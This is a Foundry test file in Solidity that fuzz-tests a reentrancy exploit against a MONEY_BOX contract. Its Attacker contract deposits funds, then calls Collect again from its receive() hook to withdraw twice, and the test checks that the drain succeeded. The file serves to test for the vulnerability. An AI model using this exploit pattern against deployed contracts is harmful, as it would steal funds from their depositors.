
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyMONEY_BOX is Test {
    using stdStorage for StdStorage;
    
    MONEY_BOX public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new MONEY_BOX();
        
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_logContract));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        vm.assume(attackVal < address(this).balance / 2);
        
        address attackerAddress = address(_attacker);
        Holder storage attackerAcc = _contractUnderTest.Acc(attackerAddress);
        
        stdstore.target(address(_contractUnderTest)).sig("Acc(address)").with_key(attackerAddress).depth(1).checked_write(uint256(0));
        stdstore.target(address(_contractUnderTest)).sig("Acc(address)").with_key(attackerAddress).depth(0).checked_write(uint256(0));
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);
        
        vm.warp(block.timestamp + 1000);
        
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;
    
    constructor(address victimAddress) { 
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Put{value: val * 2}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        attackAmount = val;
        
        victim.Collect(val);
        
        if (attackCallCount >= 2 && address(this).balance >= initialSnapshot + (val * 2) - (val * 2 / 100)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
